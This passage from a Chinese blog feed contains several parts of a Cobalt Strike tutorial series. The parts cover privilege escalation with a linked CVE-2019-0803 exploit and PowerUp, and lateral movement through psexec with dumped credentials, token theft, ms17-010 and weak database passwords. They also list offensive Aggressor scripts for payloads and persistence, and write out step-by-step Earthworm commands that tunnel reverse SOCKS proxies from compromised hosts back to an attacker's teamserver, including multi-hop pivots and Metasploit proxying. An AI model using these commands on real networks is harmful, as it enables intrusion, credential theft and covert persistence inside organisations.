href="https://github.com/k8gege/K8tools/raw/master/CVE-2019-0803.exe">https://github.com/k8gege/K8tools/raw/master/CVE-2019-0803.exe</a><br>用法:CVE-2019-0803.exe cmd cmdline，可能需要多执行几次才可以成功<br><a href="https://imgchr.com/i/e1dqd1"><img src="https://s2.ax1x.com/2019/07/29/e1dqd1.png" alt="e1dqd1.png"></a></p><h3 id="3-Powershell提权"><a href="#3-Powershell提权" class="headerlink" title="3.Powershell提权"></a>3.Powershell提权</h3><p>在此需要使用beacon中的命令-powershell-import</p><pre><code>beacon&gt; help powershell-importUse: powershell-import [/path/to/local/script.ps1]Import a powershell script which is combined with futurecalls to the powershell command. You may only use oneimported script at a time.</code></pre><p><a href="https://imgchr.com/i/e1djJK"><img src="https://s2.ax1x.com/2019/07/29/e1djJK.png" alt="e1djJK.png"></a><br>使用 powershell-import 本地导入我们的脚本，powershell执行,PowerUp.ps1 这个模块是个提权辅助模块<br>下载链接:<a href="https://github.com/HarmJ0y/PowerUp">https://github.com/HarmJ0y/PowerUp</a></p><h2 id="0x002-横向移动"><a href="#0x002-横向移动" class="headerlink" title="0x002-横向移动"></a>0x002-横向移动</h2><h3 id="横向渗透概念"><a href="#横向渗透概念" class="headerlink" title="横向渗透概念:"></a>横向渗透概念:</h3><p>横向渗透攻击技术是复杂网络攻击中广泛使用的一种技术，特别是在高级持续威胁（Advanced Persistent Threats，APT）中更加热衷于使用这种攻击方法。攻击者可以利用这些技术，以被攻陷的系统为跳板，访问其他主机，获取包括邮箱、共享文件夹或者凭证信息在内的敏感资源。攻击者可以利用这些敏感信息，进一步控制其他系统、提升权限或窃取更多有价值的凭证。借助此类攻击，攻击者最终可能获取域控的访问权限，完全控制基于Windows系统的基础设施或与业务相关的关键账户。<br>在提权后，我们可以用mimikatz dump目标机的凭证，并进行内网横向移动</p><h3 id="1-Psexec横向移动"><a href="#1-Psexec横向移动" class="headerlink" title="1.Psexec横向移动"></a>1.Psexec横向移动</h3><p>在执行端口扫描后<br>目标视图中，选择一个目标，右键–&gt;登录–p**ec，即可选择凭证进行横向移动<br><a href="https://imgchr.com/i/e1dXi6"><img src="https://s2.ax1x.com/2019/07/29/e1dXi6.png" alt="e1dXi6.png"></a><br><a href="https://imgchr.com/i/e1dvRO"><img src="https://s2.ax1x.com/2019/07/29/e1dvRO.png" alt="e1dvRO.png"></a></p><p>如果该机使用了和之前的目标机一样的凭证，则会成功返回一个system beacon<br><a href="https://imgchr.com/i/e1wpsH"><img src="https://s2.ax1x.com/2019/07/29/e1wpsH.png" alt="e1wpsH.png"></a></p><h3 id="2-窃取令牌"><a href="#2-窃取令牌" class="headerlink" title="2.窃取令牌"></a>2.窃取令牌</h3><p>在进程列表中，寻找以域管理员身份运行的进程，并选定进行steal token，如果成功，则会返回域管权限的beacon，但是一般情况下绝不会那么简单的…在此就不演示了。<br><a href="https://imgchr.com/i/e1dxzD"><img src="https://s2.ax1x.com/2019/07/29/e1dxzD.png" alt="e1dxzD.png"></a></p><h3 id="3-其他手段横向移动"><a href="#3-其他手段横向移动" class="headerlink" title="3.其他手段横向移动"></a>3.其他手段横向移动</h3><p>①使用各种系统漏洞:比如说用ms17-010，ms08-067批量检测一下内网~<br>我之前的帖子发过cobaltstrike中ms17-10的利用脚本，貌似是从Empire框架上拔下来的。如图，该脚本集成了扫描与漏洞利用，可谓是非常方便<br><a href="https://imgchr.com/i/e1w9Ld"><img src="https://s2.ax1x.com/2019/07/29/e1w9Ld.png" alt="e1w9Ld.png"></a><br>PS:等到cve2019-0708一出，又是一场腥风血雨</p><p>②弱口令检测<br>内网中ssh弱口令，各种数据库的弱口令可谓是层出不穷。Mysql可以mof提权，sqlserver可以xp_cmdshell,redis写shell，oracle也有方法执行系统命令。</p><p>③中间件漏洞<br>这个就非常常见了，比如weblogic各种rce漏洞，tomcat弱口令等等</p><p>④Web端漏洞<br>挖掘web端漏洞，大家都懂</p><p>⑤域内漏洞<br>委派、域内权限策略配置问题等</p><p>⑤密码爆破、喷洒等</p><p>大家自行总结~</p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrike系列教程(十)安装扩展</title>
      <link href="/2019/06/16/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%8D%81-%E5%AE%89%E8%A3%85%E6%89%A9%E5%B1%95/"/>
      <url>/2019/06/16/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%8D%81-%E5%AE%89%E8%A3%85%E6%89%A9%E5%B1%95/</url>
      
        <content type="html"><![CDATA[<h2 id="0x001-扩展的加载"><a href="#0x001-扩展的加载" class="headerlink" title="0x001-扩展的加载"></a>0x001-扩展的加载</h2><p>扩展是Cobaltstrike一个极为重要的模块，它有效地丰盈了cobaltstrike的功能<br>选择菜单栏的CobaltStrike–&gt;脚本管理器，点击load，然后选择cna扩展文件即可，旁边的unload为去除该扩展，，reload为重新加载该扩展<br><a href="https://imgchr.com/i/e18Nsx"><img src="https://s2.ax1x.com/2019/07/28/e18Nsx.png" alt="e18Nsx.png"></a></p><h2 id="0x002-个人常用扩展"><a href="#0x002-个人常用扩展" class="headerlink" title="0x002-个人常用扩展"></a>0x002-个人常用扩展</h2><p>本人在此放出几个自己常用的扩展，老哥们可以回复下载<br><a href="https://imgchr.com/i/e1Gete"><img src="https://s2.ax1x.com/2019/07/28/e1Gete.png" alt="e1Gete.png"></a></p><h2 id="0x003-其他扩展汇总-来自WBG老哥"><a href="#0x003-其他扩展汇总-来自WBG老哥" class="headerlink" title="0x003-其他扩展汇总(来自WBG老哥)"></a>0x003-其他扩展汇总(来自WBG老哥)</h2><h3 id="脚本名称：elevate-cna"><a href="#脚本名称：elevate-cna" class="headerlink" title="脚本名称：elevate.cna"></a>脚本名称：elevate.cna</h3><p>脚本功能：增加五种提权方式<br><a href="https://imgchr.com/i/e18JzR"><img src="https://s2.ax1x.com/2019/07/28/e18JzR.png" alt="e18JzR.png"></a></p><h3 id="脚本名称：ProcessTree-cna"><a href="#脚本名称：ProcessTree-cna" class="headerlink" title="脚本名称：ProcessTree.cna"></a>脚本名称：ProcessTree.cna</h3><p>脚本功能：让ps命令可以显示父子关系并显示颜色<br><a href="https://imgchr.com/i/e18wdO"><img src="https://s2.ax1x.com/2019/07/28/e18wdO.png" alt="e18wdO.png"></a></p><h3 id="脚本名称：CVE-2018-4878-cna"><a href="#脚本名称：CVE-2018-4878-cna" class="headerlink" title="脚本名称：CVE-2018-4878.cna"></a>脚本名称：CVE-2018-4878.cna</h3><p>脚本功能：CVE-2018-4878.cna</p><p><a href="https://imgchr.com/i/e18GW9"><img src="https://s2.ax1x.com/2019/07/28/e18GW9.png" alt="e18GW9.png"></a></p><h3 id="脚本名称：ArtifactPayloadGenerator-cna"><a href="#脚本名称：ArtifactPayloadGenerator-cna" class="headerlink" title="脚本名称：ArtifactPayloadGenerator.cna"></a>脚本名称：ArtifactPayloadGenerator.cna</h3><p>脚本功能：创建多种类型的payload。生成的文件在cs目录下的opt\cobaltstrike<br><a href="https://imgchr.com/i/e18UL6"><img src="https://s2.ax1x.com/2019/07/28/e18UL6.png" alt="e18UL6.png"></a></p><h3 id="脚本名称：AVQuery-cna"><a href="#脚本名称：AVQuery-cna" class="headerlink" title="脚本名称：AVQuery.cna"></a>脚本名称：AVQuery.cna</h3><p>脚本功能：查询目标所安装的所有杀软</p><h3 id="脚本名称：CertUtilWebDelivery-cna"><a href="#脚本名称：CertUtilWebDelivery-cna" class="headerlink" title="脚本名称：CertUtilWebDelivery.cna"></a>脚本名称：CertUtilWebDelivery.cna</h3><p>脚本功能：利用CertUtil和rundll32生成会话这个应该都知道了解</p><h3 id="脚本名称：RedTeamRepo-cna"><a href="#脚本名称：RedTeamRepo-cna" class="headerlink" title="脚本名称：RedTeamRepo.cna"></a>脚本名称：RedTeamRepo.cna</h3><p>脚本功能：就是提示一下常用的渗透命令<br><a href="https://imgchr.com/i/e180oD"><img src="https://s2.ax1x.com/2019/07/28/e180oD.png" alt="e180oD.png"></a></p><h3 id="脚本名称：ProcessColor-cna"><a href="#脚本名称：ProcessColor-cna" class="headerlink" title="脚本名称：ProcessColor.cna"></a>脚本名称：ProcessColor.cna</h3><p>脚本功能：显示带有颜色的进程列表(不同颜色有不同含义)<br>[<img src="https://s2.ax1x.com/2019/07/28/e18byq.png" alt="e18byq.png">]</p><h3 id="脚本名称：EDR-cna"><a href="#脚本名称：EDR-cna" class="headerlink" title="脚本名称：EDR.cna"></a>脚本名称：EDR.cna</h3><p>脚本功能：检查有无终端安全产品</p><h3 id="脚本名称：logvis-cna"><a href="#脚本名称：logvis-cna" class="headerlink" title="脚本名称：logvis.cna"></a>脚本名称：logvis.cna</h3><p>脚本功能：显示Beacon命令日志<br><img src="https://s2.ax1x.com/2019/07/28/e1Gfj1.png" alt="e1Gfj1.png"></p><h3 id="脚本名称：ProcessMonitor-cna"><a href="#脚本名称：ProcessMonitor-cna" class="headerlink" title="脚本名称：ProcessMonitor.cna"></a>脚本名称：ProcessMonitor.cna</h3><p>脚本功能：记录一段时间内程序启动的情况</p><h3 id="脚本名称：SMBPayloadGenerator-cna"><a href="#脚本名称：SMBPayloadGenerator-cna" class="headerlink" title="脚本名称：SMBPayloadGenerator.cna"></a>脚本名称：SMBPayloadGenerator.cna</h3><p>脚本功能：生成基于SMB的payload</p><h3 id="脚本名称：Persistence-x2F-Persistence-Menu-cna"><a href="#脚本名称：Persistence-x2F-Persistence-Menu-cna" class="headerlink" title="脚本名称：Persistence&#x2F;Persistence_Menu.cna"></a>脚本名称：Persistence&#x2F;Persistence_Menu.cna</h3><p>脚本功能：持久化控制集合<br>备注:这个脚本是同目录脚本的一个集合<br><a href="https://imgchr.com/i/e18xkF"><img src="https://s2.ax1x.com/2019/07/28/e18xkF.png" alt="e18xkF.png"></a></p><h3 id="脚本名称：Eternalblue-cna-脚本功能：ms17-010"><a href="#脚本名称：Eternalblue-cna-脚本功能：ms17-010" class="headerlink" title="脚本名称：Eternalblue.cna 脚本功能：ms17-010"></a>脚本名称：Eternalblue.cna 脚本功能：ms17-010</h3><p><a href="https://gist.github.com/rsmudge/9b54a66744a94f3950cc171254057942">https://gist.github.com/rsmudge/9b54a66744a94f3950cc171254057942</a><br>备注：调用exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</p><p>更多:<a href="https://mp.weixin.qq.com/s/CEI1XYkq2PZmYsP0DRU7jg">https://mp.weixin.qq.com/s/CEI1XYkq2PZmYsP0DRU7jg</a><br>个人认位这位老哥整理的已经很全面了，为了方便查看我将里面的一些集合脚本介绍图片列了出来。</p><p><a href="https://github.com/harleyQu1nn/AggressorScripts">https://github.com/harleyQu1nn/AggressorScripts</a><br><a href="https://imgchr.com/i/e186SA"><img src="https://s2.ax1x.com/2019/07/28/e186SA.png" alt="e186SA.png"></a></p><p><a href="https://github.com/bluscreenofjeff/AggressorScripts">https://github.com/bluscreenofjeff/AggressorScripts</a><br><a href="https://imgchr.com/i/e18gyt"><img src="https://s2.ax1x.com/2019/07/28/e18gyt.png" alt="e18gyt.png"></a></p><p><a href="https://github.com/michalkoczwara/aggressor_scripts_collection">https://github.com/michalkoczwara/aggressor_scripts_collection</a><br><a href="https://imgchr.com/i/e18Wef"><img src="https://s2.ax1x.com/2019/07/28/e18Wef.png" alt="e18Wef.png"></a><br><a href="https://github.com/vysec/Aggressor-VYSEC">https://github.com/vysec/Aggressor-VYSEC</a><br><a href="https://imgchr.com/i/e18hTS"><img src="https://s2.ax1x.com/2019/07/28/e18hTS.png" alt="e18hTS.png"></a></p><p><a href="https://github.com/killswitch-GUI/CobaltStrike-ToolKit">https://github.com/killswitch-GUI/CobaltStrike-ToolKit</a><br><a href="https://imgchr.com/i/e185Fg"><img src="https://s2.ax1x.com/2019/07/28/e185Fg.png" alt="e185Fg.png"></a><br><a href="https://github.com/ramen0x3f/AggressorScripts">https://github.com/ramen0x3f/AggressorScripts</a></p><p><a href="https://imgchr.com/i/e18oWj"><img src="https://s2.ax1x.com/2019/07/28/e18oWj.png" alt="e18oWj.png"></a></p><p><a href="https://github.com/rasta-mouse/Aggressor-Script">https://github.com/rasta-mouse/Aggressor-Script</a><br><a href="https://imgchr.com/i/e18Hln"><img src="https://s2.ax1x.com/2019/07/28/e18Hln.png" alt="e18Hln.png"></a><br><a href="https://github.com/Und3rf10w/Aggressor-scripts">https://github.com/Und3rf10w/Aggressor-scripts</a><br><a href="https://imgchr.com/i/e18qO0"><img src="https://s2.ax1x.com/2019/07/28/e18qO0.png" alt="e18qO0.png"></a><br><a href="https://github.com/001SPARTaN/aggressor_scripts">https://github.com/001SPARTaN/aggressor_scripts</a><br><a href="https://imgchr.com/i/e18OmV"><img src="https://s2.ax1x.com/2019/07/28/e18OmV.png" alt="e18OmV.png"></a></p><p><a href="https://github.com/gaudard/scripts/tree/master/red-team/aggressor">https://github.com/gaudard/scripts/tree/master/red-team/aggressor</a><br><a href="https://imgchr.com/i/e1GSfJ"><img src="https://s2.ax1x.com/2019/07/28/e1GSfJ.png" alt="e1GSfJ.png"></a><br><a href="https://github.com/branthale/CobaltStrikeCNA">https://github.com/branthale/CobaltStrikeCNA</a><br><a href="https://imgchr.com/i/e18XwT"><img src="https://s2.ax1x.com/2019/07/28/e18XwT.png" alt="e18XwT.png"></a><br><a href="https://github.com/threatexpress/aggressor-scripts">https://github.com/threatexpress/aggressor-scripts</a> <a href="https://github.com/threatexpress/red-team-scripts">https://github.com/threatexpress/red-team-scripts</a> <a href="https://github.com/threatexpress/persistence-aggressor-script">https://github.com/threatexpress/persistence-aggressor-script</a><br><a href="https://imgchr.com/i/e18jTU"><img src="https://s2.ax1x.com/2019/07/28/e18jTU.png" alt="e18jTU.png"></a></p><p><a href="https://github.com/FortyNorthSecurity/AggressorAssessor">https://github.com/FortyNorthSecurity/AggressorAssessor</a><br><a href="https://imgchr.com/i/e18zY4"><img src="https://s2.ax1x.com/2019/07/28/e18zY4.png" alt="e18zY4.png"></a></p><p>脚本来源:</p><p><a href="https://github.com/rsmudge/ElevateKit">https://github.com/rsmudge/ElevateKit</a><br><a href="https://github.com/vysec/CVE-2018-4878">https://github.com/vysec/CVE-2018-4878</a> <a href="https://github.com/harleyQu1nn/AggressorScripts">https://github.com/harleyQu1nn/AggressorScripts</a> <a href="https://github.com/bluscreenofjeff/AggressorScripts">https://github.com/bluscreenofjeff/AggressorScripts</a> <a href="https://github.com/ramen0x3f/AggressorScripts">https://github.com/ramen0x3f/AggressorScripts</a><br><a href="https://github.com/360-A-Team/CobaltStrike-Toolset">https://github.com/360-A-Team/CobaltStrike-Toolset</a> <a href="https://github.com/ars3n11/Aggressor-Scripts">https://github.com/ars3n11/Aggressor-Scripts</a> <a href="https://github.com/michalkoczwara/aggressor_scripts_collection">https://github.com/michalkoczwara/aggressor_scripts_collection</a> <a href="https://github.com/vysec/Aggressor-VYSEC">https://github.com/vysec/Aggressor-VYSEC</a><br><a href="https://github.com/killswitch-GUI/CobaltStrike-ToolKit">https://github.com/killswitch-GUI/CobaltStrike-ToolKit</a> <a href="https://github.com/ZonkSec/persistence-aggressor-script">https://github.com/ZonkSec/persistence-aggressor-script</a> <a href="https://github.com/ramen0x3f/AggressorScripts">https://github.com/ramen0x3f/AggressorScripts</a><br><a href="https://github.com/rasta-mouse/Aggressor-Script">https://github.com/rasta-mouse/Aggressor-Script</a> <a href="https://github.com/RhinoSecurityLabs/Aggressor-Scripts">https://github.com/RhinoSecurityLabs/Aggressor-Scripts</a> <a href="https://github.com/Und3rf10w/Aggressor-scripts">https://github.com/Und3rf10w/Aggressor-scripts</a><br><a href="https://github.com/Kevin-Robertson/Inveigh">https://github.com/Kevin-Robertson/Inveigh</a><br><a href="https://github.com/Genetic-Malware/Ebowla">https://github.com/Genetic-Malware/Ebowla</a> <a href="https://github.com/001SPARTaN/aggressor_scripts">https://github.com/001SPARTaN/aggressor_scripts</a> <a href="https://github.com/gaudard/scripts/tree/master/red-team/aggressor">https://github.com/gaudard/scripts/tree/master/red-team/aggressor</a> <a href="https://github.com/branthale/CobaltStrikeCNA">https://github.com/branthale/CobaltStrikeCNA</a> <a href="https://github.com/oldb00t/AggressorScripts">https://github.com/oldb00t/AggressorScripts</a> <a href="https://github.com/p292/Phant0m_cobaltstrike">https://github.com/p292/Phant0m_cobaltstrike</a> <a href="https://github.com/p292/DDEAutoCS">https://github.com/p292/DDEAutoCS</a> <a href="https://github.com/secgroundzero/CS-Aggressor-Scripts">https://github.com/secgroundzero/CS-Aggressor-Scripts</a> <a href="https://github.com/skyleronken/Aggressor-Scripts">https://github.com/skyleronken/Aggressor-Scripts</a> <a href="https://github.com/tevora-threat/aggressor-powerview">https://github.com/tevora-threat/aggressor-powerview</a> <a href="https://github.com/tevora-threat/PowerView3-Aggressor">https://github.com/tevora-threat/PowerView3-Aggressor</a> <a href="https://github.com/threatexpress/aggressor-scripts">https://github.com/threatexpress/aggressor-scripts</a> <a href="https://github.com/threatexpress/red-team-scripts">https://github.com/threatexpress/red-team-scripts</a><br><a href="https://github.com/threatexpress/persistence-aggressor-script">https://github.com/threatexpress/persistence-aggressor-script</a> <a href="https://github.com/FortyNorthSecurity/AggressorAssessor">https://github.com/FortyNorthSecurity/AggressorAssessor</a> <a href="https://github.com/mdsecactivebreach/CACTUSTORCH">https://github.com/mdsecactivebreach/CACTUSTORCH</a> <a href="https://github.com/C0axx/AggressorScripts">https://github.com/C0axx/AggressorScripts</a> <a href="https://github.com/offsecginger/AggressorScripts">https://github.com/offsecginger/AggressorScripts</a> <a href="https://github.com/tomsteele/cs-magik">https://github.com/tomsteele/cs-magik</a> <a href="https://github.com/bitsadmin/nopowershell">https://github.com/bitsadmin/nopowershell</a> <a href="https://github.com/SpiderLabs/SharpCompile">https://github.com/SpiderLabs/SharpCompile</a> <a href="https://github.com/SpiderLabs/SharpCompile">https://github.com/SpiderLabs/SharpCompile</a> <a href="https://github.com/realoriginal/reflectivepotato">https://github.com/realoriginal/reflectivepotato</a></p><p>还有很多很多我就不列出来了太麻烦了。</p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrike系列教程(九)内置Socks与神器EW</title>
      <link href="/2019/06/16/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E4%B9%9D-%E5%86%85%E7%BD%AESocks%E4%B8%8E%E7%A5%9E%E5%99%A8EW/"/>
      <url>/2019/06/16/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E4%B9%9D-%E5%86%85%E7%BD%AESocks%E4%B8%8E%E7%A5%9E%E5%99%A8EW/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-Socks概念"><a href="#0x01-Socks概念" class="headerlink" title="0x01-Socks概念"></a>0x01-Socks概念</h2><p>目前利用网络防火墙将组织内部的网络结构与外部网络如 INTERNET 中有效地隔离开来，这种方法正变得逐渐流行起来。这些防火墙系统通常以应用层网关的形式工作在网络之间，提供受控的 TELNET 、 FTP 、 SMTP 等的接入。 SOCKS 提供一个通用框架来使这些协议安全透明地穿过防火墙。<br>说的简单明了一点，在渗透测试中，我们使用socks技术，可以穿透进入目标机的内网，从而扩大我们的战果<br><img src="/"></p><h2 id="0x002-Cobaltstrike自带Socks功能"><a href="#0x002-Cobaltstrike自带Socks功能" class="headerlink" title="0x002-Cobaltstrike自带Socks功能"></a>0x002-Cobaltstrike自带Socks功能</h2><p>选择一个beacon，右键，中转–&gt;SOCKS Server，或使用命令socks [port]<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191542627.png" alt="image"></p><p>弹出一个窗口，按要求配置好代理端口<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191542560.png" alt="image"></p><p>如图，成功开启socks 4，连接我们teamserver的5126端口，即可进入目标机内网~<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191542192.png" alt="image"></p><h2 id="0x03-使用ew-SocksCap穿透到目标机内网"><a href="#0x03-使用ew-SocksCap穿透到目标机内网" class="headerlink" title="0x03-使用ew+SocksCap穿透到目标机内网"></a>0x03-使用ew+SocksCap穿透到目标机内网</h2><h3 id="①Earthworm-下载见文末"><a href="#①Earthworm-下载见文末" class="headerlink" title="①Earthworm(下载见文末)"></a>①Earthworm(下载见文末)</h3><p>Ew(Earthworm)是一款当之无愧的内网穿透大杀器，应用的平台非常广泛，包括</p><pre><code>ew_for_Win.exe        适用各种Windows系统(X86指令集、X64指令集)        Windows7、Windows XPew_for_Linux32        各常见Linux发行版 (X86 指令集 CPU)        Ubuntu(X86)/BT5(X86)ew_for_linux64        各常见Linux发行版 (X64 指令集 CPU)        Ubuntu(X64)/Kali(X64)ew_for_MacOSX64        MacOS系统发行版 (X64 指令集)        苹果PC电脑，苹果serverew_for_Arm32        常见Arm-Linux系统        HTC New One(Arm-Android)/小米路由器(R1D)ew_mipsel        常见Mips-Linux系统 (Mipsel指令集 CPU)        萤石硬盘录像机、小米mini路由器(R1CM)</code></pre><p>下面简单讲一下它的应用场景和命令<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191542432.png" alt="image"></p><h3 id="正向socks-v5服务器-【适用于目标机拥有一个外网IP】"><a href="#正向socks-v5服务器-【适用于目标机拥有一个外网IP】" class="headerlink" title="正向socks v5服务器        【适用于目标机拥有一个外网IP】"></a>正向socks v5服务器        【适用于目标机拥有一个外网IP】</h3><p>服务器端执行以下命令<br>ew.exe -s ssocksd -l 888</p><p>说明：服务器开启端口为888，SOCKS的代理。然后使用sockscap64添加这个IP的代理就可以使用了。</p><h3 id="反弹socks-v5服务器-【适用于目标机器没有公网IP，但可访问内网资源】"><a href="#反弹socks-v5服务器-【适用于目标机器没有公网IP，但可访问内网资源】" class="headerlink" title="反弹socks v5服务器        【适用于目标机器没有公网IP，但可访问内网资源】"></a>反弹socks v5服务器        【适用于目标机器没有公网IP，但可访问内网资源】</h3><p>本地执行以下命令<br>ew.exe -s rcsocks -l 1008 -e 888</p><p>说明：该命令的意思是在我们公网VPS上添加一个转接隧道，把1080端口收到的代理请求转交给888端口。</p><p>服务器端执行以下命令<br>ew.exe -s rssocks -d 2.2.2.2 -e 888</p><p>说明：该命令的意思是在服务器上启动SOCKS V5服务，并反弹到IP地址为2.2.2.2的服务器888端口上。</p><h3 id="二级网络环境（一）"><a href="#二级网络环境（一）" class="headerlink" title="二级网络环境（一）"></a>二级网络环境（一）</h3><p>假设我们获得了右侧A主机和B主机的控制权<br>A主机配有2块网卡，一块连通外网，一块10.48.128.25只能连接内网B主机，无法访问内网其它资源。<br>B主机可以访问内网资源，但无法访问外网。</p><p>A.先上传ew到B主机，利用ssocksd方式启动888端口的SOCKS代理，命令如下：<br>ew -s ssocksd -l 888</p><p>B.上传ew到右侧A主机，运行下列命令：<br>ew -s lcx_tran -l 1080 -f 10.48.128.49 -g 888</p><p>说明：该命令意思是将1080端口收到的代理请求转交给B主机（10.48.128.49）的888端口。</p><p>C.可以通过访问A主机外网139.XXX.XX.113:1080来使用在B主机架设的socks5代理。</p><h3 id="二级网络环境（二）"><a href="#二级网络环境（二）" class="headerlink" title="二级网络环境（二）"></a>二级网络环境（二）</h3><p>假设我们获得了右侧A主机和B主机的控制权限。<br>A主机没有公网IP，也无法访问内网资源。B主机可以访问内网资源，但无法访问外网。</p><p>这个操作分为4步，用到lcx_listen和lcx_slave命令：</p><p>A. 先上传ew 到左侧公网VPS上，运行下列命令：<br>ew –s lcx_listen –l 10800 –e 888<br>说明：该命令意思是在公网VPS添加转接隧道，将10800端口收到的代理请求转交给888端口。</p><p>B.上传ew到B主机，并利用ssocksd方式启动999端口的socks代理，命令如下：<br>ew -s ssocksd -l 999</p><p>C.上传ew 到A主机，运行下列命令：<br>ew -s lcx_slave -d 139.XXX.XX.113 -e 888 -f 10.48.128.49 -g 999<br>说明：该命令意思是在A主机上利用lcx_slave方式，将公网VPS的888端口和B主机的999端口连接起来。</p><p>D. 返回我们公网VPS的CMD界面下，可以看到已经连接成功了。<br>现在就可以通过访问公网VPS地址 139.XXX.XX.113:10800来使用在B主机架设的socks5代理。</p><h3 id="三级网络环境"><a href="#三级网络环境" class="headerlink" title="三级网络环境"></a>三级网络环境</h3><p>三级网络环境在实际渗透中用的比较少，也比较复杂，现在我们来一个个的讲解下三级级联的用法。</p><p>假设渗透场景：<br>内网A主机没有公网IP但可以访问外网<br>B主机不能访问外网但可以被A主机访问、C主机可被B主机访问而且能够访问核心区域。</p><p>A.在左侧公网VPS上运行命令，将1080端口收到的代理请求转交给888端口：<br>ew -s rcsocks -l 1080 -e 888</p><p>B.在A主机上运行命令，将公网VPS的888端口和B主机的999端口连接起来：<br>ew -s lcx_slave -d 139.XXX.XX.113 -e 888 -f 10.48.128.12 -g 999</p><p>C.在B主机上运行命令，将999端口收到的代理请求转交给777端口：<br>ew -s lcx_listen -l 999 -e 777</p><p>D.在C主机上启动SOCKS V5服务，并反弹到B主机的777端口上，命令如下。<br>ew -s rssocks -d 10.48.128.12 -e 777</p><p>E.在MY PC上可以通过访问公网VPS 139.XXX.XX.113:1080来使用在C主机架设的socks5代理。</p><p>整个数据流向是：SOCKS V5 → 1080 → 888 →999 →777 → rssocks</p><h2 id="实战场景"><a href="#实战场景" class="headerlink" title="实战场景"></a>实战场景</h2><p>本次测试目标机器没有公网IP，但可访问内网资源<br>1.我们在teamserver上运行以下命令<br>ew.exe -s rcsocks -l 1008 -e 888<br>接受888端口数据，然后转发到1008端口<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191542245.png" alt="image"></p><p>2.然后我们在目标机上传ew，然后在cs中执行<br>ew.exe -s rssocks -d 2.2.2.2 -e 888（2.2.2.2为teamserver）<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191542860.png" alt="image"></p><p>3.随后，我们的teamserver就会显示连接成功<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191542807.png" alt="image"></p><h3 id="②使用SocksCap连接socks"><a href="#②使用SocksCap连接socks" class="headerlink" title="②使用SocksCap连接socks"></a>②使用SocksCap连接socks</h3><p>根据自己的Windows版本以管理员模式运行SocksCap后<br>点击代理，然后添加自己teamserver的ip和刚刚转发出来的端口<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191542246.png" alt="image"></p><p>在这里把代理切换成刚刚添加的<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191542779.png" alt="image"></p><p>右键，添加一个exe文件，根据你的需求，添加要在socks隧道中运行的程序</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191543208.png" alt="image"></p><p>选择程序，右键–&gt;在代理隧道中运行选中程序，该程序即可通过socks进入目标内网</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191543868.png" alt="image"></p><p>如图，为连入socks通道的cmd ping目标机的某内网ip<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191543675.png" alt="image"></p><h2 id="0x004-在Kali中Metasploit使用socks通道"><a href="#0x004-在Kali中Metasploit使用socks通道" class="headerlink" title="0x004-在Kali中Metasploit使用socks通道"></a>0x004-在Kali中Metasploit使用socks通道</h2><p>1.使用cs搭建好socks4通道后，首先配置神器proxychains<br>在&#x2F;etc&#x2F;proxychains.conf配置文件中添加新的代理服务器。通过激活动态链设置，确保在不同的代理服务器之间能够正常切换。</p><pre><code>root@kali:~# cat /etc/proxychains.conf | grep -v &quot;#&quot;dynamic_chainproxy_dnstcp_read_time_out 15000tcp_connect_time_out 8000socks4  172.16.0.20 1080  # socks4通道的IP及端口</code></pre><p>然后在MSF中，配置socks4隧道即可让MSF进入目标机内网大杀四方<br>(2.2.2.2为teamserver的ip，1081为socks端口)</p><pre><code>msf exploit(ms08_067_netapi) &gt; use auxiliary/server/socks4amsf auxiliary(socks4a) &gt; set SRVHOST 2.2.2.2msf auxiliary(socks4a) &gt; set SRVPORT 1081SRVPORT =&gt; 1081msf auxiliary(socks4a) &gt; runAuxiliary module execution completedStarting the socks4a proxy servermsf auxiliary(socks4a) &gt;</code></pre><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191543028.png" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrike系列教程(八)截图与浏览器代理</title>
      <link href="/2019/06/15/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%85%AB-%E6%88%AA%E5%9B%BE%E4%B8%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BB%A3%E7%90%86/"/>
      <url>/2019/06/15/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%85%AB-%E6%88%AA%E5%9B%BE%E4%B8%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BB%A3%E7%90%86/</url>
      
